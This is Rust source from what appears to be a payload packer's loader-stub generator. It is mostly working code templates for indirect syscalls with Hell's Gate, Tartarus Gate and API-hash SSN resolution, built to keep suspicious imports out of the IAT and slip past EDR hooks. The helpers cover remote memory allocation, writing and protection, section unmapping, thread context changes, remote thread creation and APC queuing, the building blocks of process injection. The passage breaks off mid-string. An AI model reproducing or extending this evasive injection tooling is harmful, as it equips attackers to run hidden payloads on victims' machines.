//! Syscall layer configuration and stub rendering.
//!
//! `build.stub.syscalls` (YAML) selects how the generated stub talks to the
//! kernel. It is a *loader* concern, not a pipeline technique: it changes how the
//! stub
//! invokes primitives, not how the payload runs. Two modes exist:
//!
//! - [`SyscallsMode::None`]: the technique fragments call the same `nt_*`
//!   helpers, but the helpers map to the plain Win32 APIs.
//! - [`SyscallsMode::Indirect`]: the helpers resolve SSNs at runtime (Hell's
//!   Gate from the live ntdll, Tartarus Gate from a clean copy read from disk,
//!   or API hashing matching each export by a precomputed FNV-1a hash) and
//!   invoke the kernel through the `syscall; ret` gadget in ntdll's `.text`,
//!   so the suspicious Win32 imports never appear in the IAT.
//!
//! The fragment contract is: technique fragments always call the `nt_*`
//! helpers (never the Win32 APIs directly), and the helper implementation
//! depends on the mode. A fragment never knows whether syscalls are active.
//!
//! The SSN table only contains the functions the active techniques need:
//! `TechniqueDef::syscalls` lists each technique's Nt* requirements and the
//! union (in the canonical [`NT_FUNCTIONS`] order) is what the stub resolves.

use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};

use crate::error::{PackerError, Result};
use crate::plan::schema::PayloadFormat;
use crate::techniques::{stack_spoofing, RuntimeStep};

use super::obfuscation::StringsConfig;

mod pe_file;
mod prelude;
pub mod resolvers;

/// Raw `build.stub.syscalls` YAML block, before semantic validation.
///
/// `mode` and `resolver` are kept as plain strings here so that
/// [`SyscallsConfig::from_yaml`] can report clear errors for invalid values
/// instead of a generic deserialization message.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlSyscallsPlan {
    /// Syscall mode (`none` or `indirect`).
    #[serde(default = "default_mode")]
    pub mode: String,

    /// SSN resolver (`hells_gate` or `tartarus_gate`).
    #[serde(default = "default_resolver")]
    pub resolver: String,
}

fn default_mode() -> String {
    "none".to_string()
}

fn default_resolver() -> String {
    "hells_gate".to_string()
}

/// How the stub invokes the kernel.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SyscallsMode {
    /// Plain Win32 calls; the helpers wrap the Win32 APIs directly.
    None,
    /// Indirect syscalls with runtime SSN resolution.
    Indirect,
}

impl SyscallsMode {
    /// Lowercase label used in the build summary.
    pub fn label(self) -> &'static str {
        match self {
            SyscallsMode::None => "none",
            SyscallsMode::Indirect => "indirect",
        }
    }
}

/// SSN resolution strategy for `mode: indirect`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Resolver {
    /// Hell's Gate: read the SSN from the Nt* stub prologue in the live ntdll.
    /// Fails with a clear error when an EDR has hooked the export stub.
    HellsGate,
    /// Tartarus Gate: read the SSN from a clean copy of ntdll read from disk,
    /// so hooks in the live ntdll's export stubs do not hide the SSN.
    TartarusGate,
    /// API hashing: resolve each SSN by a precomputed FNV-1a hash of its name,
    /// walking a clean copy of ntdll read from disk, so neither `GetProcAddress`
    /// nor any function-name string is needed.
    ApiHash,
}

impl Resolver {
    /// Lowercase label used in the verbose build output.
    pub fn label(self) -> &'static str {
        match self {
            Resolver::HellsGate => "hells_gate",
            Resolver::TartarusGate => "tartarus_gate",
            Resolver::ApiHash => "api_hash",
        }
    }
}

/// Resolved syscall-layer configuration.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SyscallsConfig {
    /// How the stub invokes the kernel.
    pub mode: SyscallsMode,
    /// How the SSNs are resolved when the mode is `indirect`.
    pub resolver: Resolver,
}

impl Default for SyscallsConfig {
    fn default() -> Self {
        Self {
            mode: SyscallsMode::None,
            resolver: Resolver::HellsGate,
        }
    }
}

impl SyscallsConfig {
    /// Resolves the syscall plan from the (optional) YAML block.
    ///
    /// `None` means the defaults (`mode: none`, `resolver: hells_gate`). An
    /// unknown mode or resolver is a validation error with a clear message.
    pub fn from_yaml(yaml: Option<&YamlSyscallsPlan>) -> Result<Self> {
        let Some(yaml) = yaml else {
            return Ok(Self::default());
        };

        let mode = match yaml.mode.as_str() {
            "none" => SyscallsMode::None,
            "indirect" => SyscallsMode::Indirect,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.syscalls.mode '{other}': expected 'none' or 'indirect'"
                )));
            }
        };

        let resolver = match yaml.resolver.as_str() {
            "hells_gate" => Resolver::HellsGate,
            "tartarus_gate" => Resolver::TartarusGate,
            "api_hash" => Resolver::ApiHash,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.syscalls.resolver '{other}': expected 'hells_gate', \
                     'tartarus_gate' or 'api_hash'"
                )));
            }
        };

        Ok(Self { mode, resolver })
    }
}

/// One Nt* function the stub can invoke through the syscall layer.
struct NtFunction {
    /// Export name in ntdll (obfuscated with [`StringsConfig`] at render time).
    name: &'static str,
    /// Field of the generated `SsnTable` holding this function's SSN.
    table_field: &'static str,
    /// Name of the generated helper the technique fragments call.
    helper_name: &'static str,
    /// Helper body for `mode: none` (direct Win32 call).
    helper_none: &'static str,
    /// Helper body for `mode: indirect` (syscall through the gadget).
    helper_indirect: &'static str,
}

// --- Generated helper bodies -------------------------------------------------
//
// Each helper documents its Nt* signature in a comment (comments never reach
// the binary). The bodies are plain text injected into the generated stub;
// see the fragment contract in the module docs above.

/// `nt_alloc_vm`, mode none: VirtualAllocEx mapped to an NTSTATUS.
const ALLOC_VM_NONE: &str = r#"    /// NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, ZeroBits,
    /// &RegionSize, AllocationType, Protect). None mode: VirtualAllocEx with
    /// the result mapped to an NTSTATUS. The actual base comes back through
    /// `base`, the actual size through `size`.
    pub fn nt_alloc_vm(
        process: HANDLE,
        base: *mut *mut core::ffi::c_void,
        _zero_bits: usize,
        size: *mut usize,
        alloc_type: u32,
        protect: u32,
    ) -> i32 {
        unsafe {
            let requested = if (*base).is_null() {
                None
            } else {
                Some(*base as *const core::ffi::c_void)
            };
            let address = VirtualAllocEx(
                process,
                requested,
                *size,
                VIRTUAL_ALLOCATION_TYPE(alloc_type),
                PAGE_PROTECTION_FLAGS(protect),
            );
            if address.is_null() {
                return STATUS_UNSUCCESSFUL;
            }
            *base = address;
            STATUS_SUCCESS
        }
    }
"#;

/// `nt_alloc_vm`, mode indirect: syscall with the resolved SSN.
const ALLOC_VM_INDIRECT: &str = r#"    /// NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, ZeroBits,
    /// &RegionSize, AllocationType, Protect). BaseAddress/RegionSize are
    /// in-out pointers: the actual base/size come back through them.
    pub fn nt_alloc_vm(
        process: HANDLE,
        base: *mut *mut core::ffi::c_void,
        zero_bits: usize,
        size: *mut usize,
        alloc_type: u32,
        protect: u32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                zero_bits,
                size as usize,
                alloc_type as usize,
                protect as usize,
                0,
                0,
                0,
                0,
                0,
                ssns.alloc_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_write_vm`, mode none.
const WRITE_VM_NONE: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToWrite, &NumberOfBytesWritten). None mode:
    /// WriteProcessMemory mapped to an NTSTATUS (the HRESULT carries the Win32
    /// error, so a failure is diagnosable).
    pub fn nt_write_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *const core::ffi::c_void,
        size: usize,
        written: *mut usize,
    ) -> i32 {
        unsafe {
            match WriteProcessMemory(process, base, buffer, size, Some(written)) {
                Ok(()) => STATUS_SUCCESS,
                Err(e) => e.code().0,
            }
        }
    }
"#;

/// `nt_write_vm`, mode indirect.
const WRITE_VM_INDIRECT: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToWrite, &NumberOfBytesWritten).
    pub fn nt_write_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *const core::ffi::c_void,
        size: usize,
        written: *mut usize,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                buffer as usize,
                size,
                written as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.write_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_read_vm`, mode none.
const READ_VM_NONE: &str = r#"    /// NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToRead, &NumberOfBytesRead). None mode: ReadProcessMemory
    /// mapped to an NTSTATUS (the HRESULT carries the Win32 error).
    pub fn nt_read_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        unsafe {
            match ReadProcessMemory(process, base, buffer, size, Some(read)) {
                Ok(()) => STATUS_SUCCESS,
                Err(e) => e.code().0,
            }
        }
    }
"#;

/// `nt_read_vm`, mode indirect.
const READ_VM_INDIRECT: &str = r#"    /// NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToRead, &NumberOfBytesRead).
    pub fn nt_read_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                buffer as usize,
                size,
                read as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.read_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_resume_thread`, mode none.
const RESUME_THREAD_NONE: &str = r#"    /// NtResumeThread(ThreadHandle, &PreviousSuspendCount). None mode:
    /// ResumeThread mapped to an NTSTATUS.
    pub fn nt_resume_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        unsafe {
            let count = ResumeThread(thread);
            if count == u32::MAX {
                return STATUS_UNSUCCESSFUL;
            }
            if !previous.is_null() {
                *previous = count;
            }
            STATUS_SUCCESS
        }
    }
"#;

/// `nt_resume_thread`, mode indirect.
const RESUME_THREAD_INDIRECT: &str = r#"    /// NtResumeThread(ThreadHandle, &PreviousSuspendCount).
    pub fn nt_resume_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                previous as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.resume_thread,
                *gadget,
            )
        }
    }
"#;

/// `nt_unmap_view`, mode none: windows-rs does not declare
/// `NtUnmapViewOfSection`, so it is resolved dynamically (as before phase 6a).
/// `$NTDLL_DEF$` / `$UNMAP_FUNC_DEF$` are substituted by the renderer with
/// runtime-reconstructed (obfuscated) strings.
const UNMAP_VIEW_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type UnmapViewFn = unsafe extern "system" fn(HANDLE, *const core::ffi::c_void) -> i32;

    /// NtUnmapViewOfSection(ProcessHandle, BaseAddress). None mode: resolve
    /// the export dynamically (windows-rs does not declare it) and call it.
    pub fn nt_unmap_view(process: HANDLE, base: *mut core::ffi::c_void) -> i32 {
        let address = resolve_nt_export(&$UNMAP_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let unmap: UnmapViewFn = unsafe { std::mem::transmute(address) };
        unsafe { unmap(process, base) }
    }
"#;

/// `nt_unmap_view`, mode indirect.
const UNMAP_VIEW_INDIRECT: &str = r#"    /// NtUnmapViewOfSection(ProcessHandle, BaseAddress).
    pub fn nt_unmap_view(process: HANDLE, base: *mut core::ffi::c_void) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.unmap_view,
                *gadget,
            )
        }
    }
"#;

/// `nt_protect_vm`, mode none: VirtualProtectEx mapped to an NTSTATUS.
const PROTECT_VM_NONE: &str = r#"    /// NtProtectVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize,
    /// NewProtect, &OldProtect). None mode: VirtualProtectEx mapped to an
    /// NTSTATUS. The address and size are passed by value (the caller does
    /// not need the in-out results).
    pub fn nt_protect_vm(
        process: HANDLE,
        base: *mut core::ffi::c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        unsafe {
            match VirtualProtectEx(
                process,
                base,
                size,
                PAGE_PROTECTION_FLAGS(new_protect),
                old_protect as *mut PAGE_PROTECTION_FLAGS,
            ) {
                Ok(()) => STATUS_SUCCESS,
                Err(_) => STATUS_UNSUCCESSFUL,
            }
        }
    }
"#;

/// `nt_protect_vm`, mode indirect: syscall with the resolved SSN.
const PROTECT_VM_INDIRECT: &str = r#"    /// NtProtectVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize,
    /// NewProtect, &OldProtect). BaseAddress/RegionSize are in-out pointers;
    /// the helpers expose them by value so the caller can ignore the results.
    pub fn nt_protect_vm(
        process: HANDLE,
        base: *mut core::ffi::c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let mut base_addr = base;
        let mut region = size;
        unsafe {
            nt_invoke(
                process.0 as usize,
                &mut base_addr as *mut _ as usize,
                &mut region as *mut _ as usize,
                new_protect as usize,
                old_protect as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.protect_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_suspend_thread`, mode none: SuspendThread mapped to an NTSTATUS.
const SUSPEND_THREAD_NONE: &str = r#"    /// NtSuspendThread(ThreadHandle, &PreviousSuspendCount). None mode:
    /// SuspendThread mapped to an NTSTATUS.
    pub fn nt_suspend_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        unsafe {
            let count = SuspendThread(thread);
            if count == u32::MAX {
                return STATUS_UNSUCCESSFUL;
            }
            if !previous.is_null() {
                *previous = count;
            }
            STATUS_SUCCESS
        }
    }
"#;

/// `nt_suspend_thread`, mode indirect.
const SUSPEND_THREAD_INDIRECT: &str = r#"    /// NtSuspendThread(ThreadHandle, &PreviousSuspendCount).
    pub fn nt_suspend_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                previous as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.suspend_thread,
                *gadget,
            )
        }
    }
"#;

/// `nt_query_info_process`, mode none: windows-rs does not declare
/// `NtQueryInformationProcess`, so it is resolved dynamically (like
/// `nt_unmap_view`). `$QUERY_FUNC_DEF$` is substituted by the renderer with a
/// runtime-reconstructed (obfuscated) string.
const QUERY_INFO_PROCESS_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type QueryInfoFn = unsafe extern "system" fn(
        HANDLE,
        i32,
        *mut core::ffi::c_void,
        u32,
        *mut u32,
    ) -> i32;

    /// NtQueryInformationProcess(ProcessHandle, ProcessInformationClass,
    /// ProcessInformation, ProcessInformationLength, ReturnLength). None mode:
    /// resolve the export dynamically (windows-rs does not declare it).
    pub fn nt_query_info_process(
        process: HANDLE,
        info_class: i32,
        info: *mut core::ffi::c_void,
        info_len: u32,
        return_len: *mut u32,
    ) -> i32 {
        let address = resolve_nt_export(&$QUERY_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let query: QueryInfoFn = unsafe { std::mem::transmute(address) };
        unsafe { query(process, info_class, info, info_len, return_len) }
    }
"#;

/// `nt_query_info_process`, mode indirect.
const QUERY_INFO_PROCESS_INDIRECT: &str = r#"    /// NtQueryInformationProcess(ProcessHandle, ProcessInformationClass,
    /// ProcessInformation, ProcessInformationLength, ReturnLength).
    pub fn nt_query_info_process(
        process: HANDLE,
        info_class: i32,
        info: *mut core::ffi::c_void,
        info_len: u32,
        return_len: *mut u32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                info_class as usize,
                info as usize,
                info_len as usize,
                return_len as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.query_info_process,
                *gadget,
            )
        }
    }
"#;

/// `nt_get_context_thread`, mode none: windows-rs does not declare
/// `NtGetContextThread`, so it is resolved dynamically. `$GET_CONTEXT_FUNC_DEF$`
/// is substituted by the renderer with a runtime-reconstructed (obfuscated)
/// string.
const GET_CONTEXT_THREAD_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type GetContextFn = unsafe extern "system" fn(HANDLE, *mut core::ffi::c_void) -> i32;

    /// NtGetContextThread(ThreadHandle, &Context). None mode: resolve the
    /// export dynamically (windows-rs does not declare it).
    pub fn nt_get_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
        let address = resolve_nt_export(&$GET_CONTEXT_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let get_context: GetContextFn = unsafe { std::mem::transmute(address) };
        unsafe { get_context(thread, context) }
    }
"#;

/// `nt_get_context_thread`, mode indirect.
const GET_CONTEXT_THREAD_INDIRECT: &str = r#"    /// NtGetContextThread(ThreadHandle, &Context).
    pub fn nt_get_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                context as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.get_context_thread,
                *gadget,
            )
        }
    }
"#;

/// `nt_set_context_thread`, mode none: windows-rs does not declare
/// `NtSetContextThread`, so it is resolved dynamically (like `nt_get_context_thread`).
/// `$SET_CONTEXT_FUNC_DEF$` is substituted by the renderer with a
/// runtime-reconstructed (obfuscated) string.
const SET_CONTEXT_THREAD_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type SetContextFn = unsafe extern "system" fn(HANDLE, *mut core::ffi::c_void) -> i32;

    /// NtSetContextThread(ThreadHandle, &Context). None mode: resolve the
    /// export dynamically (windows-rs does not declare it).
    pub fn nt_set_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
        let address = resolve_nt_export(&$SET_CONTEXT_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let set_context: SetContextFn = unsafe { std::mem::transmute(address) };
        unsafe { set_context(thread, context) }
    }
"#;

/// `nt_set_context_thread`, mode indirect.
const SET_CONTEXT_THREAD_INDIRECT: &str = r#"    /// NtSetContextThread(ThreadHandle, &Context).
    pub fn nt_set_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                context as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.set_context_thread,
                *gadget,
            )
        }
    }
"#;

/// `nt_create_thread_ex`, mode none: `CreateRemoteThread` (which also takes the
/// current process handle), mapped to an NTSTATUS. The Win32 flag values differ
/// from the native ones, so only the create-suspended bit is translated.
const CREATE_THREAD_EX_NONE: &str = r#"    /// Signature of a thread start routine (one pointer argument).
    type ThreadStartFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;

    /// Native `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`; Win32 spells the same idea
    /// `CREATE_SUSPENDED` with a different value (4), so the helper translates.
    const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;
    const WIN32_CREATE_SUSPENDED: u32 = 0x0000_0004;

    /// NtCreateThreadEx(&ThreadHandle, DesiredAccess, &ObjectAttributes,
    /// ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
    /// MaximumStackSize, &AttributeList). None mode: `CreateRemoteThread` on
    /// `process` (the current process handle works too).
    pub fn nt_create_thread_ex(
        process: HANDLE,
        thread: *mut HANDLE,
        start: usize,
        argument: usize,
        create_flags: u32,
    ) -> i32 {
        if start == 0 {
            return STATUS_INVALID_PARAMETER;
        }
        let flags = if create_flags & THREAD_CREATE_FLAGS_CREATE_SUSPENDED != 0 {
            WIN32_CREATE_SUSPENDED
        } else {
            0
        };
        let start: ThreadStartFn = unsafe { std::mem::transmute(start) };
        unsafe {
            match CreateRemoteThread(
                process,
                None,
                0,
                Some(start),
                Some(argument as *const core::ffi::c_void),
                flags,
                None,
            ) {
                Ok(handle) => {
                    if !thread.is_null() {
                        *thread = handle;
                    }
                    STATUS_SUCCESS
                }
                Err(_) => STATUS_UNSUCCESSFUL,
            }
        }
    }
"#;

/// `nt_create_thread_ex`, mode indirect.
const CREATE_THREAD_EX_INDIRECT: &str = r#"    /// Native `THREAD_CREATE_FLAGS_CREATE_SUSPENDED` (accepted by
    /// `NtCreateThreadEx` as-is).
    const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;

    /// `THREAD_ALL_ACCESS`; the native bitmask (not the Win32 constant, which
    /// only matches on Vista+).
    const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;

    /// NtCreateThreadEx(&ThreadHandle, DesiredAccess, &ObjectAttributes,
    /// ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
    /// MaximumStackSize, &AttributeList). Eleven arguments — the widest call the
    /// trampoline carries.
    pub fn nt_create_thread_ex(
        process: HANDLE,
        thread: *mut HANDLE,
        start: usize,
        argument: usize,
        create_flags: u32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread as usize,
                THREAD_ALL_ACCESS as usize,
                0,
                process.0 as usize,
                start,
                argument,
                create_flags as usize,
                0,
                0,
                0,
                0,
                ssns.create_thread_ex,
                *gadget,
            )
        }
    }
"#;

/// `nt_wait_for_single_object`, mode none: `WaitForSingleObject` already returns
/// the NTSTATUS-compatible `WAIT_*` values (`WAIT_OBJECT_0` = `STATUS_SUCCESS`,
/// `WAIT_TIMEOUT` = `STATUS_TIMEOUT`, `WAIT_FAILED` = `0xFFFFFFFF`).
const WAIT_FOR_SINGLE_OBJECT_NONE: &str = r#"    /// NtWaitForSingleObject(Handle, Alertable, &Timeout). None mode:
    /// `WaitForSingleObject` in milliseconds (`u32::MAX` = infinite).
    pub fn nt_wait_for_single_object(handle: HANDLE, timeout_ms: u32) -> i32 {
        unsafe { WaitForSingleObject(handle, timeout_ms).0 as i32 }
    }
"#;

/// `nt_wait_for_single_object`, mode indirect. The 100 ns relative timeout is
/// derived from the millisecond value the callers use.
const WAIT_FOR_SINGLE_OBJECT_INDIRECT: &str = r#"    /// NtWaitForSingleObject(Handle, Alertable, &Timeout).
    pub fn nt_wait_for_single_object(handle: HANDLE, timeout_ms: u32) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        // A relative timeout is negative and in 100 ns units; an infinite wait
        // passes a null pointer.
        let mut timeout: i64 = 0;
        let timeout_ptr = if timeout_ms == u32::MAX {
            std::ptr::null_mut()
        } else {
            timeout = -i64::from(timeout_ms) * 10_000;
            &mut timeout
        };
        unsafe {
            nt_invoke(
                handle.0 as usize,
                0,
                timeout_ptr as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.wait_for_single_object,
                *gadget,
            )
        }
    }
"#;

/// `nt_query_info_thread`, mode none: windows-rs does not declare
/// `NtQueryInformationThread`, so it is resolved dynamically (like
/// `nt_query_info_process`). `$QUERY_THREAD_FUNC_DEF$` is substituted by the
/// renderer with a runtime-reconstructed (obfuscated) string.
const QUERY_INFO_THREAD_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type QueryThreadFn = unsafe extern "system" fn(
        HANDLE,
        i32,
        *mut core::ffi::c_void,
        u32,
        *mut u32,
    ) -> i32;

    /// NtQueryInformationThread(ThreadHandle, ThreadInformationClass,
    /// ThreadInformation, ThreadInformationLength, ReturnLength). None mode:
    /// resolve the export dynamically (windows-rs does not declare it).
    pub fn nt_query_info_thread(
        thread: HANDLE,
        info_class: i32,
        info: *mut core::ffi::c_void,
        info_len: u32,
        return_len: *mut u32,
    ) -> i32 {
        let address = resolve_nt_export(&$QUERY_THREAD_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let query: QueryThreadFn = unsafe { std::mem::transmute(address) };
        unsafe { query(thread, info_class, info, info_len, return_len) }
    }
"#;

/// `nt_query_info_thread`, mode indirect.
const QUERY_INFO_THREAD_INDIRECT: &str = r#"    /// NtQueryInformationThread(ThreadHandle, ThreadInformationClass,
    /// ThreadInformation, ThreadInformationLength, ReturnLength).
    pub fn nt_query_info_thread(
        thread: HANDLE,
        info_class: i32,
        info: *mut core::ffi::c_void,
        info_len: u32,
        return_len: *mut u32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                info_class as usize,
                info as usize,
                info_len as usize,
                return_len as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.query_info_thread,
                *gadget,
            )
        }
    }
"#;

/// `nt_close`, mode none.
const CLOSE_NONE: &str = r#"    /// NtClose(Handle). None mode: CloseHandle mapped to an NTSTATUS.
    pub fn nt_close(handle: HANDLE) -> i32 {
        unsafe {
            match CloseHandle(handle) {
                Ok(()) => STATUS_SUCCESS,
                Err(_) => STATUS_UNSUCCESSFUL,
            }
        }
    }
"#;

/// `nt_close`, mode indirect.
const CLOSE_INDIRECT: &str = r#"    /// NtClose(Handle).
    pub fn nt_close(handle: HANDLE) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                handle.0 as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.close,
                *gadget,
            )
        }
    }
"#;

/// Every Nt* function the stub can invoke, in canonical (rendering) order.
/// `nt_open_process`, mode none.
const OPEN_PROCESS_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type OpenProcessFn = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        u32,
        *const core::ffi::c_void,
        *const core::ffi::c_void,
    ) -> i32;

    /// NtOpenProcess(&Handle, DesiredAccess, &ObjectAttributes, &ClientId). None
    /// mode: resolve the export dynamically (windows-rs does not declare it) and
    /// call it. `attributes` and `client_id` are opaque here.
    pub fn nt_open_process(
        handle: *mut core::ffi::c_void,
        access: u32,
        attributes: *const core::ffi::c_void,
        client_id: *const core::ffi::c_void,
    ) -> i32 {
        let address = resolve_nt_export(&$OPEN_PROCESS_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let open: OpenProcessFn = unsafe { std::mem::transmute(address) };
        unsafe { open(handle, access, attributes, client_id) }
    }
"#;

/// `nt_open_process`, mode indirect.
const OPEN_PROCESS_INDIRECT: &str = r#"    /// NtOpenProcess(&Handle, DesiredAccess, &ObjectAttributes, &ClientId).
    pub fn nt_open_process(
        handle: *mut core::ffi::c_void,
        access: u32,
        attributes: *const core::ffi::c_void,
        client_id: *const core::ffi::c_void,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                handle as usize,
                access as usize,
                attributes as usize,
                client_id as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.open_process,
                *gadget,
            )
        }
    }
"#;

/// `nt_queue_apc`, mode none: `QueueUserAPC` mapped to an NTSTATUS.
///
/// The native call carries three APC arguments; the Win32 one carries a single
/// pointer-sized value, so only `argument1` survives the mapping. The Win32
/// error is mapped to an HRESULT so a failure names the real reason.
const QUEUE_APC_NONE: &str = r#"    /// Signature of a user APC routine (one pointer-sized argument).
    type ApcRoutineFn = unsafe extern "system" fn(usize);

    /// NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2,
    /// ApcArgument3). None mode: `QueueUserAPC`.
